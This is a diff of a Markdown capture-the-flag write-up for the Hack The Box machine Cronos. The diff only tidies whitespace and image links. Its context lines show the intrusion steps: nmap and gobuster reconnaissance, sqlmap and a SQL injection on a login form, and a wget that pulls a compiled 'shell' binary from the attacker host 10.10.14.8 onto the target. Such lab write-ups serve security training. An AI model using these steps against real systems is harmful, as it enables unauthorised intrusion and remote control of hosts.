@@ -18,12 +18,12 @@ nmap -sC -sV -o nmap/cronos.nmap 10.10.10.13
 
 ```markdown
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
 |   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
 |_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
 53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
-| dns-nsid: 
+| dns-nsid:
 |_  bind.version: 9.10.3-P4-Ubuntu
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 |_http-server-header: Apache/2.4.18 (Ubuntu)
@@ -38,12 +38,12 @@ As this server has DNS open there will probably be _Virtual Host Routing_ active
 
 Now we see a real web page with this:
 
-![Cronos web page](https://kyuu-ji.github.io/htb-write-up/cronos/cronos_web-page.png)
+![Cronos web page](cronos_web-page.png)
 
 All the links have something to do with a software called **Laravel** which is a PHP framework.
 As this won't help much we start _Gobuster_ to look for hidden paths on this site:
 ```markdown
-gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://cronos.htb/ 
+gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://cronos.htb/
 ```
 
 We only get _/server-status_ but with a HTTP code 403 (Forbidden).
@@ -67,13 +67,13 @@ cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 
 The most interesting one is probably **admin.cronos.htb** so lets put the domains in the _Hosts_ file and browse there.
 It gives us a login page:
 
-![Cronos login page](https://kyuu-ji.github.io/htb-write-up/cronos/cronos_login-page.png)
+![Cronos login page](cronos_login-page.png)
 
 ### Exploiting the Login Page
 
 After copying the request for the login page and saving it as a file (login.req) we try a SQL Injection with _SQLMap_ on this:
 ```markdown
-sqlmap -r login.req 
+sqlmap -r login.req
 ```
 
 Interesting output from SQLMap:
@@ -83,11 +83,11 @@ Interesting output from SQLMap:
 
 So lets try a basic SQL Injection on the username field:
 
-![Cronos SQL Injection](https://kyuu-ji.github.io/htb-write-up/cronos/cronos_sqli.png)
+![Cronos SQL Injection](cronos_sqli.png)
 
 And we are logged in and see this page:
 
-![Cronos Welcome page](https://kyuu-ji.github.io/htb-write-up/cronos/cronos_welcome-page.png)
+![Cronos Welcome page](cronos_welcome-page.png)
 
 ### Exploiting the Net Tool
 
@@ -147,7 +147,7 @@ And compile it:
 gcc shell.c -o shell
 ```
 
-Now we need to upload this shell on the box and make it executable: 
+Now we need to upload this shell on the box and make it executable:
 ```markdown
 # Downloading the binary on the box
 wget http://10.10.14.8:8000/shell
